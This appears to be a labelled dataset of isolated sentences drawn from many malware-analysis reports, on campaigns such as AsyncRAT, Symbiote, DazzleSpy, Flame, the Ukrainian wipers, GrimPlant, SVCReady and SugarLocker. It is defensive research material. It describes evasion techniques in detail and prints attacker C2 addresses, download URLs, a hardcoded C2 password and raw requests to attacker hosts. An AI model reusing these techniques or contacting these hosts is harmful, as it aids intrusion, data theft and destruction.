1	The parent malware downloader (Google Play Store) application gets its config from Firebase for its database.
1	As shown in the above screen shot, the malware will only download further banking payloads if the Enabled parameter is set to true.
1	Here the banking payload has the Telegram page link encoded with RC4 encryption.
1	Uses Telegram link response to create C2 in addition to static encrypted C2 present in app
1	ThreatLabz also observed RC4 encoded C2 domains stored inside the code.
1	The following screenshot shows the C2 request in which the payload sends all the installed applications to C2 in order to receive further instructions.
1	In one case, it will present the fake login page of a targeted banking application if the legitimate application is installed in the infected device.
1	Malware uploading all package information to receive commands
1	ThreatLabz also observed another application, named  (Expense Keeper), exhibiting similar behavior.
1	On execution of this application, it is observed that the Enabled parameter is set to false, same as the execution previously shown in Figure 4.
1	Due to that, it was not possible to retrieve the Dropper URL for the banking payload.
1	The malicious document was sent as an email attachment.
1	If the user opens the document, they are shown a prompt asking whether fields with references to other files should be updated.
1	An Excel file opens if they click Yes to this cryptic message.
1	Afterwards, the user is shown another prompt asking whether macros should be enabled or disabled.
1	If the user allows macros, this triggers the infection chain, eventually leading to the execution of the malware payload, AsyncRAT.
1	Unlike many malicious documents, analyzing the OpenDocument file reveals no hidden macros.
1	However, the document references Object Linking and Embedding (OLE) objects hosted remotely, as shown in the styles.xml file.
1	The document references 20 documents hosted on the same domain, webnar[.]info.
1	When opening the document, these references are downloaded and opened.
1	Based on our analysis, the same document is always downloaded and contains no macro code.
1	However, the downloaded document contains ten embedded Excel spreadsheets.
1	If the user chose to enable macros at the prompt in Figure 3, each of these Excel files opens and asks the user if macros should be activated.
1	The Visual Basic for Applications (VBA) macro inside the Excel documents is lean, running a command using the mshta.exe (T1218.005) tool built into Windows that downloads and executes additional code from the web.
1	At this point, a complex chain of PowerShell, VBScript and batch scripts are started, finally decoding and executing AsyncRAT, an open-source remote access trojan written in C#.
1	A scheduled task is created to make the malware persistent on the infected PC.
1	The task re-launches the malware every two hours.
1	The significant part of this infection chain is how the attacker evaded detection by relying on the OpenDocument format to load malware using external OLE objects.
1	Instead of being a standalone executable file that is run to infect a machine, it is a shared object (SO) library that is loaded into all running processes using LD_PRELOAD (T1574.006), and parasitically infects the machine.
1	Once it has infected all the running processes, it provides the threat actor with rootkit functionality, the ability to harvest credentials, and remote access capability.
1	Once the malware has infected a machine, it hides itself and any other malware used by the threat actor, making infections very hard to detect.
1	Performing live forensics on an infected machine may not turn anything up since all the file, processes, and network artifacts are hidden by the malware.
1	In addition to the rootkit capability, the malware provides a backdoor for the threat actor to log in as any user on the machine with a hardcoded password and to execute commands with the highest privileges.
1	One interesting technical aspect of Symbiote is its Berkeley Packet Filter (BPF) hooking functionality.
1	When an administrator starts any packet capture tool on the infected machine, BPF bytecode is injected into the kernel that defines which packets should be captured.
1	The malware is designed to be loaded by the linker via the LD_PRELOAD directive.
1	Since it is loaded first, it can hijack the imports from the other library files loaded for the application.
1	Symbiote uses this to hide its presence on the machine by hooking libc and libpcap functions.
1	When hooked functions are called, the malware first dynamically loads libc and calls the original function.
1	If the calling application is trying to access a file or folder under /proc, the malware scrubs the output from process names that are on its list.
1	Some of the file names match those used by Symbiote, while others match names of files suspected to be tools used by the threat actor on the infected machine.
1	One consequence of Symbiote being loaded into processes via LD_PRELOAD is that tools like ldd, a utility that prints the shared libraries required by each program, will list the malware as a loaded object.
1	To counter this, the malware hooks execve and looks for calls to this function with the environment variable LD_TRACE_LOADED_OBJECTS set to 1.
1	To understand why, its worth looking at the manual page for ldd:
1	In the usual case, ldd invokes the standard dynamic linker (see ld.so(8)) with the LD_TRACE_LOADED_OBJECTSenvironmentvariablesetto1.
1	This causes the dynamic linker to inspect the programs dynamic dependencies, and find (according to the rules described in ld.so(8)) and load the objects that satisfy those dependencies.For each dependency, ldd displays the location of the matching object and the (hexadecimal) address at which it is loaded.
1	When the malware detects this, it executes the loader as ldd does, but it scrubs its own entry from the result.
1	The first method involves hooking fopen and fopen64.
1	If the calling application tries to open /proc/net/tcp, the malware creates a temp file and copies the first line to that file.
1	After that, it scans each line for the presence of specific ports.
1	If the malware finds a port its searching for on a line its scanning, it skips to the next line.
1	Otherwise, the line is written to the temp file.
1	Once the original file has been completely processed, the malware closes the file and returns the file descriptor of the temp file back to the caller.
1	The Linux kernel uses extended Berkeley Packet Filter (eBPF) to allow packet filtering based on rules provided from a userland process.
1	The filtering rule is provided as eBPF bytecode that the kernel executes on a virtual machine (VM).
1	This minimizes the context switching between kernel and userland, providing a performance boost since the kernel performs the filtering directly.
1	If an application on the infected machine tries to perform packet filtering with eBPF, Symbiote hijacks the filtering process.
1	First, it hooks the libc function setsockopt.
1	If the function is called with the option SO_ATTACH_FILTER, which is used to perform packet filtering on a socket, it prepends its own bytecode before the eBPF code provided by the calling application.
1	The bytecode drops if they match the following conditions:
1	While this bytecode only drops packets based on ports, we have also observed filtering of traffic based on IPv4 addresses.
1	If the conditions are not met, it just jumps to the start of the bytecode provided by the calling application.
1	The third method Symbiote uses to hide its network traffic is to hook libpcap functions.
1	This method is used by the malware to filter out UDP traffic to domain names it has in a list.
1	It hooks the functions pcap_loop and pcap_stats to accomplish this task.
1	For each packet that is received, Symbiote checks the UDP payload for substrings of the domains it wants to filter out.
1	If it finds a match, the malware ignores the packet and increments a counter.
1	The pcap_stats uses this counter to correct the number of packets processed by subtracting the counter value from the true number of packets processed.
1	If a packet payload does not contain any of the strings it has in its list, the original callback function is called.
1	The main functionalities of this malware that can be used to perform malicious activities are:Send GET/POST requests, which can be used to get malicious resources.
1	In this malicious extension, the manifest.json file injects campaign.js on all http/https pages.
1	The campaign.js starts with identifying the Operating System using the window.navigator API.
1	After successful identification, it injects a Javascript file that mines cryptocurrency using the victims computer resources.
1	The next step on the chain is injecting another script named cthulhu.js.
1	This file contains a full-chain exploit for CVE-2019-11708 & CVE-2019-9810 targeting Firefox on a 64-bit Windows Operating System.
1	Upon successful exploitation, it drops Windows-based malware on the device, enabling the threat actor to take over the entire system.
1	After identifying the browser type, the script adds a new event listener using the onkeypress event, which is fired when any key producing a character is pressed.
1	Whenever this event is fired, the corresponding keystroke value is appended to a variable.
1	This keylogging data, along with any form data present on the current webpage, is sent to the C&C whenever any of the following events is fired:
1	When the user navigates away from the page (by clicking on a link, submitting a form, closing the browser window, etc.).
1	When a user reloads the page beforeunload event occurs when the document is about to be unloaded
1	For example, when the user clicks the browsers Back button, the current page receives a pagehide event before the previous page is shown.
1	These events make sure that the data is sent to the C&C as soon as the user navigates to a different page.
1	The javascript file then calls a function named pingHome after a timeout of 20 seconds, which sends a GET request to the C&C and expects a command in return.
1	The command is passed to another function named Parse, which executes the code respective to the command received from the C&C server.
1	Apart from that, this malware uses a few more browser exploits for Internet Explorer (CVE-2014-6332, CVE-2016-0189) and Edge (CVE-2016-7200).
1	If an attacker successfully exploits this vulnerability, they could gain the same user rights as the current user and can execute code on the victims device as the current user.
1	If the current user is logged on with administrative user rights, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.
1	The extension can also send POST requests to any domain.
1	This functionality can be enhanced to carry out a layer 7 DDOS attack if the attacker has a significant number of victims connected as botnets.
1	The developer is likely using this botnet to provide a service to perform DDOS.
1	There are a few other functionalities, such as clickjacking, cracking md5/sha1 hashes, and executing any javascript provided by the C&C server.
1	This email attempted to lure the victim to open the attached compressed file with the following line Operation The Eye of Sauron results followed by the password needed to open the attachment.
1	Once executed, the password-protected self-extracting RAR will drop on the system an executable called Doc_Viewer.exe or DocumentSaver.exe, and a DLL called SQLite.Interop.dll.
1	The executable is a .NET infostealer which uses the bundled DLL to interact with various browsers SQLite databases and extract the stored credentials and cookies.
1	Trellix Network Security (NX) uses multiple analysis techniques to detect different wiper families that have been observed in the wild.
1	The Multi-Vector Virtual Execution (MVX) engine detects zero-day, multi-flow, and other evasive attacks with dynamic, signature-less analysis in a safe, virtual environment.
1	It stops infection and compromise phases of the cyber-attack kill chain by identifying never-before-seen exploits and malware.
1	In the event of a wiper attack, Trellix NX will detonate the malware, extract and submits suspicious network traffic to the MVX engine for a definitive verdict analysis.
1	Response actions include automatically blocking inbound exploits and outbound multi-protocol call backs.
1	Alerts detected by Trellix Email Security (EX or ETP Cloud)/Network Security (NX) are shared to Trellix Endpoint Security (HX) for additional detection on endpoints.
1	During the lateral movement phase, SmartVision identifies traffic over SMB protocols where threat actors use the SMB v1 and SMB v2 protocols to transfer malware and tools.
1	In our example it extracted and identified the uploaded RemComSvc binary QUfQlccm.exe (MD5: 6983f7001de10f4d19fc2d794c3eb534) as Malware.Binary.
1	The attack uses SMB version 1 and TCP port 445 to propagate.
1	Threat hunters can identify the network base events which contributed to the SmartVision correlated alert.
1	As seen in Figure 3, the page hosted on the malicious amnestyhk[.]org domain checks for the installed macOS version and redirects to the next stage if the browser is running on macOS 10.15.2 or newer.
1	The next stage, named 4ba29d5b72266b28.html (see Figure 4) simply loads the JavaScript containing the exploit code  mac.js.
1	The updated JavaScriptCore code now checks whether the object contains properties with GetterSetter after the property enumeration, before considering whether the objects attribute can be accessed quickly.
1	As explained by Google TAG, the JavaScript loads a Mach-O executable file in memory.
1	The rudimentary loader does not implement importing symbols from external libraries; instead, the addresses of dlopen and dlsym are patched into the loaded Mach-O.
1	These can then be used from the executable to dynamically load and get the addresses of functions from external libraries.
1	Now that code execution has been gained, the next stage is a Mach-O that is loaded into memory and executed.
1	This Mach-O exploits a local privilege escalation vulnerability to run the next stage as root.
1	To summarize, the Mach-O does the following:
1	Downloads a file from the URL supplied as an argument
1	Decrypts this file using AES-128-EBC and TEA with a custom delta
1	Writes the resulting file to $TMPDIR/airportpaird and makes it executable
1	Uses the privilege escalation exploit to remove the com.apple.quarantineattribute from the file to avoid asking the user to confirm the launch of the unsigned executable
1	Uses the same privilege escalation to launch the next stage with root privileges
1	The decrypted payload is where our analysis differs the most from what was described by Google TAG: the payload delivered to vulnerable visitors to the D100 site was new macOS malware weve named DazzleSpy.
1	In order to persist on the compromised device, the malware adds a Property List file (plist; see Figure 8) named com.apple.softwareupdate.plist to the LaunchAgents folder.
1	The malware executable file is named softwareupdate and saved in the $HOME/.local/ folder.
1	DazzleSpy connects to a hardcoded C&C server; the IP address and port found in the sample we decrypted was 88.218.192[.]128:5633.
1	At first, the malware performs a TLS handshake, then uses a custom protocol to exchange JSON objects to deliver commands from the C&C server to compromised Macs.
1	Once the malware obtains the current date and time on a compromised computer, as you see in Figure 11, it converts the obtained date to the Asia/Shanghai time zone (aka China Standard Time), before sending it to the C&C server.
1	The binary component associated with FLASK is rpcns4.ocx, that exports a single function only: RpcNsBindingInit.
1	It is written in the same manner as the main module and features encrypted strings that are decrypted in DllEntry.
1	Like the other FLAME modules, FLASK gets copied in the temporary folder of the infected machine under the name ~mso2a2.tmp.
1	if the victim has installed mobile telephone applications (Nokia PC Suite, Sony Ericson PC Suite), this information will be present Will also test if ipcsvnt32.dll is found in %windir%\system32, which may be another component
1	If encrypting data as it gets sent over the web is usually beneficial for the user, Flamer.A uses it against them.
1	The infected PCs connect to an array of servers to which they send encrypted data over HTTPS.
1	The other C&C servers we tested during the preliminary analysis (quick-net.info, smart-access.net, traffic-spot.biz and traffic-spot.com) now respond with 404: Not Found, which probably means that the group behind their operation is shutting down the business or switching to newer servers.
1	Although the Flamer.A Trojan is not concealed by a rootkit, it uses a series of tricks to stay hidden and stealthily export stolen data.
1	Even if the short name for this file is HUB001.DAT, the long name is set to ., which is interpreted by Windows as the current directory.
1	A closer look inside the file reveals that it is encrypted with a substitution algorithm.
1	Once decrypted, the contents reveal a SQL schema containing the activity of the malware on the infected system, such as Core LUA components with attributes such as SPREADABLE, a log of leaked files, as well as an event log detailing the activity of every single LUA module.
1	Since most sensitive targets operate in isolated environments where data cant be leaked out via a connection to the Internet, the malware dumps this SQL schema on the USB drive, and will probably send it to the attackers when the disk is plugged into a computer with access to the internet.
1	In most cases, the malicious applications masquerade as PDF documents, photos, or audio.
1	When the victim opens the decoy content, the malware begins to perform extensive surveillance actions in the background.
1	These include stealing sensitive data such as the device info, SMS and calls, the device location, and files stored on the device.
1	The malware is also capable of actively executing commands to run a remote shell, take photos, perform calls, manipulate the SMS, call logs and local files, and record the surround sound.
1	When the victim opens the lure, whether it is a document, picture, or audio file, it actually launches the malicious application, which in turn opens a decoy document to distract the victim from background malicious actions.
1	Some of the versions also ask for Device Admin and root access, which not only gives the malware full access to the device, but also prevents the victim from easily uninstalling the application:
1	The malware then hides its icon and launches two services: core and open.
1	The open service is responsible for showing the victim the decoy content (a PDF file or an image or an audio record) which is stored in res/raw/, res/drawable/ or assets:
1	The core service launches the Communication thread, which connects to the C&C (command & control) server and processes the commands received, and the KeepAlive thread, which periodically triggers a connection to the server and relaunches the parent service.
1	The malware developer also created BroadcastReceiver that starts the core Service.
1	The triggers for this receiver are numerous actions registered in the AndroidManifest, making sure the malware stays active all the time.
1	Depending on the sample, the malware can use a hardcoded list of C&C servers, dead drop resolvers, or both.
1	First, the malware starts the process of resolving the C&C server, which includes decoding the built-in C&C addresses and, where it is defined, extracting the C&C server from dead drop resolvers which point to additional C&C infrastructure.
1	First, the malware requests a specific blog page:
1	Then it searches the received HTML for a specific base64-encoded regex pattern and decodes it to get the real C&C IP address and port.
1	In this specific example, the string MjA5Ljk3LjE3My4xMjQ6MjY3NQ== is decoded to 209.97.173.124:2675.
1	The malware then creates a socket connection to the specified IP and port.
1	To secure communication with the C&C server, the malware encrypts the data with AES.
1	The key is generated in runtime from an encrypted passphrase inside dex by calculating the MD5 digest:
1	After successfully connecting to the C&C, the malware processes commands from the remote server.
1	It first reads a command, then an argument size, and finally the actual encrypted arguments.
1	The geolocation data is immediately sent by the spyware to the remote server.
1	The malware can receive commands to execute a remote shell, which is done by starting a thread that, in turn, starts a shell process and establishes a socket connection to the same C&C server, but over a different port.
1	When it receives a command to install an APK, the malware starts a thread that checks if it has enough privileges to install the application silently.
1	If the check fails, the malware launches a regular UI installation via intent:
1	The 2015 version of MobileOrder masqueraded as a PDF document, with an embedded PDF called rd.pdf in the applications resources.
1	This is similar to all the new samples in the ongoing campaign where the decoy content is PDF files.
1	Stage1 replacesthe Master Boot Record (MBR) with a ransom note when the system is powered down, deeming the machine unbootable after that point.
1	Stage 2 attemptsto download the next stage malware (T1102.003) from the Discord app, if unsuccessful, it sleeps and tries again.
1	The payload downloaded from the messaging app destroys as much data as possible by overwriting certain file types with 0xCC for the first MB of the file.
1	Then it modifiesthe file extension to a random four-byte extension.
1	By selecting the file types to be wiped and only writing over the first MB of data, the attackers areoptimizing the wiping process.
1	Finally, the malware executesa command to delete itself from the system (T1070.004).
1	The wiper component first installs the payload as a service (T1569.002) under C:\Windows\system32\Drivers\.
1	Afterwards, the service corrupts the first 512 bytes of the MBR of all the Physical Drives, and then enumerates their partitions.
1	Before attempting to overwrite as much data as the wiper can it will delete key files in the partition, like MFT, $Bitmap, $LogFile, the NTUSER registry hive (T1112) and the event logs (T1070.001).
1	Finally, the malware writes randomized contents into all occupied sectors in the partition in an attempt to remove all potential hope of recovering any data with forensic tools or procedures.
1	IsaacWiper identifies all the physical drives not containing the Operative System and locks their logical partitions by only allowing a single thread toaccesseach of them.
1	Then it starts to write random data into the drives in chunks of 64 KB.
1	Creating a new file under the C drive which will be filled with random data until it takes the maximum space it can from the partition, overwriting the already overwritten existing files.
1	This process is performed with a different thread, but it would still take a long time to write the full partition since both concurrent threads are actually attempting to write random data on the full disk.
1	This sample specifically sets an exclusion to avoid infecting Domain Controllers in the infected system.
1	Afterwards, it targets C:/Users and any additional attached drive all the way to letter Z:/ and zeroes all the files present in such folders/drives.
1	Finally, the extended information of the physical drives is destroyed, including the MBR and partition entries.
1	Named DoubleZero, the wiper was distributed as a ZIP file containing an obfuscated .NET program.
1	The wipers routine sets a hardcoded list of system directories, which are skipped during an initial wiping targeting user files.
1	Afterwards, the skipped system directories are targeted and finally the registry hives: HKEY_LOCAL_MACHINE (containing the hives Sam, Security, Software and System), HKEY_CURRENT_USER and HKEY_USERS.
1	Upon execution, the first-stage SWF exploit gathers system information and communicates with a compromised pivot server.
1	A second-stage Adobe Flash payload is retrieved, decrypted, and executed.
1	The final payload, a ROKRAT Windows PE file is downloaded and executed.
1	This app store is used as a gateway to redirect the users to attacker-registered domains hosting the backdoored versions of Kavach application.
1	By leveraging the web archive feature, it can be seen in Figure 6 that in May 2022, the download link for Kavach on this app store pointed to kavach-app[.]com (which is a confirmed attacker-registered domain used in the campaign).
1	A few months later in October 2022, the threat actor updated the link to point to another malicious site (kavachauthentication.blogspot[.]com) as shown in Figure 7.
1	The app store - acmarketsapp[.]com itself is pushed to the top in Google search results for certain search keywords from India by abusing the Google Ads paid search feature as described earlier.
1	This URL shortcut file is placed in the Windows Startup directory with the name: "Limepad.dll" and it points to the local file path of the malicious payload as shown below.
1	Also, in each request to the server, an HTTP request header field called "Auth_Token" will be present.
1	This value is the same as the password which is also sent in the HTTP request.
1	This 32 characters password is generated by base64-encoding the random value generated by os.random() using the following code.
1	Sends a POST request to the file "information.php" on the server with the credentials used to register the infected machine.
1	The username and password are sent as both - HTTP POST request body and HTTP request headers.
1	"Username" and "Auth_Token" fields in request headers correspond to the username and password respectively.
1	POST body format is: USERNAME=<username>&PASSWORD=<password>This is followed by a GET request to "information.php" to confirm user registration.
1	The fake installer is a .NET binary which masquerades as a legit Kavach application installer and uses fake metadata information.
1	Moreover, the binary uses an icon related to the National Informatics Center(NIC) which is an Indian government department under the Ministry of Electronics and Information Technology.
1	Performs the time zone check and executes further only if the time zone matches Indian Standard Time (IST).
1	Extracts and drops the legit Kavach installer in the path "C:\ProgramData\Kavach-Auth\".
1	Downloads and drops the Stage-2 payload from the URL "http://139.59.79[.]86/hardwell.mp3" in the path
1	Executes the dropped legit Kavach installer
1	Moves the dropped Stage-2 payload to the path "C:\ProgramData\Kavach-Auth\archiveviewer.scr"
1	Executes the dropped
1	Creates the directory "c:\programdata\WUDFHost"
1	Creates a log file in the path "c:\programdata\WUDFHost\logs.txt" which is updated according to the operations performed during further execution.
1	Performs the time zone check.
1	Downloads, drops and executes the next stage payload.
1	Creates a log file in the path "c:\\programdata\\WUDFHost\\process.txt"
1	Loads the assembly from the path "c:\\programdata\\WUDFHost\\oraclenotepad45.dll"
1	Creates a fake file in the path "c:\\\\programdata\\\\Expense_Account_Hierarchy.csv" and writes fake information to it.
1	Pass the execution control to the loaded assembly
1	Once it is deployed, the threat actors will gain the same access to the systems as the user account that the payload was executed as, either as an administrator or a regular user.
1	By default, it uses /login to send the first message, after which the agent sends requests to /checkin by default.
1	Once the user opens the link two files are downloaded, one is Cobalt Strike Beacon the other is a dropper that will download and execute two additional files.
1	These additional files are base64 encoded, the files saved as: microsoft-cortana.exe (classified as GraphSteel) and oracle-java.exe (GrimPlant backdoor).
1	The attached file had macros that, once executed, created a file called Base-Update.exe  a malware that downloads and executes two other files classified as GraphSteel and GrimPlant by the CERT.
1	While reviewing the emails transport path, we noticed that the domain mdfi.gov.ua did not have a configured SPF record to prevent email spoofing.
1	An SPF record is used to restrict which IP addresses are allowed to send emails for a specific domain.
1	If this record is not set, any IP address is technically allowed to send emails using that domain name.
1	The location of the implants entrypoint is unknown and has been guessed to be in the root folder.
1	While called the dropper in the framework, this component does not have an embedded payload.
1	The next stage is downloaded from the URL hxxp://194.31.98.124:443/i and saved to the users home directory (%HOME%/.java-sdk/java-sdk.exe).
1	The next stage is executed with the command line flag -a 0CyCcrhI/6B5wKE8XLOd+w==, base64 and AES encrypted information about the C2 server.
1	The screenshot below shows the malware using the Wait function to sleep for 10 seconds before allocating 200 mb of garbage data.
1	Persistence is established by adding a new key entry with the name Java-3DK to the registry key Software\Microsoft\Windows\CurrentVersion\Run.
1	After this, the malware checks if a new binary exists by comparing its MD5 hash with a hash from the server.
1	If no update is needed, it downloads the other two components.
1	GrimPlant is a backdoor that allows the operator to execute arbitrary PowerShell scripts on the infected machine.
1	The backdoor has a relatively small set of functionality, for example it doesnt have any persistence functionality on its own.
1	When the malware first is executed, it allocates 200 mb and sleeps for 10 seconds, the function shown in the screenshot below.
1	The port used by the C2 server is hardcoded to port 80.
1	GrimPlant communicates with the C2 server over gRPC.
1	The communication is encrypted with TLS.
1	The malware has an embedded root certificate that it uses to verify that it talks to a trusted server.
1	When the malware first connects to the C2 server, it authenticates itself with the password sdrunlygvhwbcaeiuklgunvre.
1	After a successful authentication, it sends a heartbeat message every 10 seconds.
1	If a command is received it executes it by spawning a PowerShell instance by executing %windir%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe and returns the result to the C2 server.
1	If it finds a file with a matching file extension, it generates the MD5 hash for the file and checks with the C2 server if the file has already been uploaded.
1	Of note, data exfiltration for these payloads was to 65.21.133.231 (assigned to AS24940 - Hetzner Online GmbH).Figure 8: Data Exfiltration to 65.21.133.231Examining threat telemetry for 65.21.133.231:47430, it is apparent that this particular campaign became active on 20 August 2022, and to date has seen at least 500 victims.
1	The observed victims were dispersed globally, with the highest concentrations in Brazil, India, and South Africa, based on IP geo-location data.Finally, a third Bitbucket account (named mrssoprano666) was identified, again associated with 185.215.113.92.Figure 9: mrssoprano666 Bitbucket AccountIn this case, we pay witness to a potential career change.
1	Once a user had entered their credentials, they were directed to download a file called Fidelity Protect Services.
1	The first JavaScript injection payload sends a unique hash to the C2 to register and identify the victim on the admin side.However, some updates to the second stage payload have been noted.
1	A DOCX file with an external link to an OLE object (RTF file), which contains and drops a JavaScript fileAll of these cases end up with either the downloading or dropping of files and then the execution of JavaScript code, which is a dropper used to install the main backdoor + stealer.The downloaded RTF files exploit the CVE-2017-11882 vulnerability.
1	It drops a file named 1.a (a JavaScript code), which drops the backdoor + stealer into a folder in ProgramData and directly executes it or creates a scheduled task to execute the dropped files at a later time.
1	The content of the newly created folder contains a few files, including Rekeywiz (EFS REKEY wizard, FA86B5BC5343CA92C235304B8DCBCF4188C6BE7D4621C625564BEBD5326ED850), which is a legitimate Windows application.This application loads various system DLL libraries, including shell32.dll, which sideloads DUser.dll, one of shell32s DelayImports.However, a fake DUser.dll gets loaded into the process.
1	This fake DLL library decrypts the main backdoor + stealer from the .tmp file in the same directory.The decryption process is a simple XOR, where the key is the first 32 bytes from the encrypted file and the payload are the remaining bytes.
1	The decrypted payload is the main backdoor .NET executable binary.In Resources, the Default resource contains the encrypted configuration.
1	The content of the newly created folder contains a few files, including Rekeywiz (EFS REKEY wizard, FA86B5BC5343CA92C235304B8DCBCF4188C6BE7D4621C625564BEBD5326ED850), which is a legitimate Windows application.
1	The decrypted payload is the main backdoor .NET executable binary.In Resources, the Default resource contains the encrypted configuration.
1	The attackers sent Microsoft Word document (.doc) attachments to targets via email.
1	As in many other malware campaigns, the documents contain Visual Basic for Applications (VBA) AutoOpen macros that are used to execute malicious code.
1	But unlike other Office malware, the document does not use PowerShell or MSHTA to download further payloads from the web.
1	Instead, the VBA macro runs shellcode stored in the properties of the document, which then drops and runs SVCReady malware.
1	First, two Windows API functions are defined in the VBA code: SetTimer and VirtualProtect.
1	Next the shellcode, which is located in the document properties, is loaded into a variable.
1	The shellcode, now in a variable, is then stored in memory so that it can be assigned executable access rights by calling VirtualProtect.
1	At this point, the execution of the VBA macros ends, and the shellcode takes over the next steps of the infection.
1	First, a dynamic link library (DLL) is dropped into the %TEMP% directory.
1	Next, the shellcode copies rundll32.exe from the Window system directory into the %TEMP% directory.
1	At this point, rundll32.exe is renamed, presumably to evade detection.
1	This execution launches SVCReady.
1	The DLL started via rundll32.exe acts as a downloader, with additional functionalities for collecting information about the infected system and communicating with a command and control (C2) server.
1	As soon as the downloader runs, it reports to the C2 server and immediately starts gathering information.
1	It is also queries the Registry, specifically the HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System key, for the details about the computers manufacturer, BIOS and firmware.
1	The malware gathers this information through Windows API calls rather than Windows Management Instrumentation (WMI) queries.
1	All the information is formatted as JSON and sent to the C2 server through an HTTP POST request.
1	The malware creates a scheduled task called RecoveryExTask that runs the file copied to Roaming with rundll32.exe and a function name when the system starts.
1	At this point, the malware creates a new registry key that may be useful for building a signature to detect the malware: HKEY_CURRENT_USER\Software\Classes\CLSID\{E6D34FFC-AD32-4d6a-934C-D387FA873A19}
1	This time, the SVCReady takes a screenshot and sends it to the C2 server.
1	The malware then runs the systeminfo.exe process.
1	Finally, the malware makes two WMI queries that are used to determine whether its runtime environment is virtualized or not:Select AccessState from Win32_USBControllerDeviceselect * from CIM_ComputerSystem
1	Once 1) is executed, it loads 2),KeysNormalize.dlla .NET Dynamic-Link Library (DLL) that was unpacked to memory.
1	It is run by invoking one of its functions (sk41Ua2AFu5PANMKit.abiJPmfBfTL6iLfmaW.Y5tFvU8EY()).
1	This post discusses how 3) can be recovered using debugging.
1	One approach is to dumpKeysNormalize.dll from memory using dnspy as a debugger.
1	It had been obfuscated with the obfuscation tool called SmartAssembly.
1	To find out what the third stage is (Metal.dll) and then dump it into a file, we need to be able to debugKeysNormalize.dll.
1	The next step is to include the KeysNormalize.dllin the project.
1	First, we copy the DLL into the project folder (Figure 3).
1	We also need to add a reference to theKeysNormalize.dll.
1	We should now be able to start using the KeysNormalize.dll in the project.
1	We need to invoke the following function (we know this from the analysis of the original binary, not discussed here):sk41Ua2AFu5PANMKit.abiJPmfBfTL6iLfmaW.Y5tFvU8EY("4F515364", "746771", "BattleshipLiteLibrary");To do this, we first need to import sk41Ua2AFu5PANMKit, which is the namespace in KeysNormalize in Program.cs.1
1	To overcome the resource problem, we need to satisfy the needs of KeysNormalize.dll and create a resource called BattleshipLiteLibrary.Properties.Resources.resources.
1	Double-click the Properties in the Solution Explorer and change the Default namespace to BattleshipLiteLibrary, as shown in Figure 10.
1	Right-click the namespace in Program.cs,choose Rename, and change it to BattleshipLiteLibrary, as shown in Figure 11.
1	Custom encoding and encryption algorithmSugarLocker uses a custom encryption algorithm to encrypt strings and data.
1	The custom encoding algorithm is mainly used when leaking information to a server or storing it in the registry.4.
1	Back up important data to a specific registryIn the HKCU\SOFTWARE\ path, a path using the string of [ID1] is created to back up important data.
1	Generate File Encryption Key(single mode) When generating a different file encryption key for each PC, the key is created by combining random values generated by the following 7 different ways with |.
1	For this, before execution, an attacker must separately create a file in one of the paths below.C:\Users\[Username]\AppData\Local\Temp\cmd.txtC:\Users\[Username]\Appdata\Local\cmd.txtC:\cmd.txt8
1	Collecting infected device informationfid field refers to PubkeyMode and FileEncryptionMode, and encryption-related data is encoded with a custom encoding algorithm, and all finally combined data is encoded in the same way.
1	After that, this value is stored in the 4 registry as custom encrypted.Among them, the IP of the infected device is collected in the form of sequentially accessing the following 5 IP whois site and parsing the IP.https://whatismyipaddress.comhttps://www.ip2location.comhttps://www.whatismyip.com/ip-address-lookup/http://checkip.dyndns.orghttps://get.geojs.io/v1/ip/geo.js9.
1	Create mutexIf the FLAG_Debug option is disabled, a mutex is created and duplicate execution is checked.
1	If the SugarLocker process has already been running, the current process is terminated.
1	Register in the registry to automatically run after bootingIf the FLAG_Autorun option is enabled, the SugarLocker is executed every boot by registering the current file path in the registry below.PATH: HKCU\Software\Microsoft\Windows\CurrentVersion\RunKey: [ID2]Value: [Current path]11.
1	Infected device information leaked to the IP of the C2 serverBy creating a thread, the information of the infected device is sent to the C2 server every 15 minutes.
1	In case of successful transmission, a message encoded with a custom encoding algorithm 200 string is received from the server.
1	Additional actions such as receiving data and executing commands are not implemented.POST / HTTP/1.1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (WindowsNT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 OPR/73.0.3856.284Host: 179.43.160.195Content-Length: [Data Length]Cache-Control: no-cache12.
1	Download the Tor browser to access the negotiation site1) First, to create a Tor browser directory on the desktop, the desktop path is collected according to the Integrity Level of the current token.System Privileges: Finds user logon sessions and collects the user profile pathOther Privileges: Collect DESKTOP path with SHGetKnownFolderPath API2) After that, access the download URL to download additional files.Download URL: http://cdn2546713[.]cdnmegafiles.com/data23072021_1.datGET /data23072021_1.dat HTTP/1.1User-Agent: Mozilla/5.0 (WindowsNT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 OPR/73.0.3856.284Host: cdn2546713.cdnmegafiles.comCache-Control: no-cache3) Then, the 16-byte MD5 value at the top of the file is compared with the MD5 hash of the rest of the data to verify whether the file has been downloaded successfully.
1	The data of 0~3 offset represents the size of the compressed file, and the data of 4~7 offset represents the data size after decompression.7) Decompress the lower data using aPLib.8) The extracted data is saved in the structure of [File size][File path][File data], and all data related to the Tor browser are stored.9) Finally, connect to the negotiation page by inputting the firefox.exe file name and negotiation page URL as parameters as shown below.
1	The infected device information at this time is the same as the value stored in the 4 registry and ransom note.C:\Users\[Username]\Desktop\browser\firefox.exe allow-remote [ONION_URL]?data=[Infected device information]10) Create a shortcut on the desktop to run the above command line.Filename: SUPPORT (TOR_BROWSER).lnk13.
1	Create a trace file in the temp pathJust before performing file encryption, one TXT file is created in the %temp% path and the string 0 is stored.Filepath: C:\Users\[Username]\AppData\Local\Temp un_[Current Time].txt14.
1	*, which targets all files.1) Paths excluded from encryption (7 total)2) Files excluded from encryption (4 total)3) Extensions excluded from encryption (12 total)15.
1	Also, by creating a separate thread that encrypts the current users desktop path, the priority is increased to perform encryption.
1	When executing, if the parameter -net=0 is not included, encryption is also performed on network shared drives.Local driveRemovable driveNetwork share driveDesktop3) When encrypting the network drive, the target network drive path is logged and encrypted by classifying the resource type through the DisplayType of the network resource as shown below.4) A target file is selected by referring to the list and file properties collected in 14.
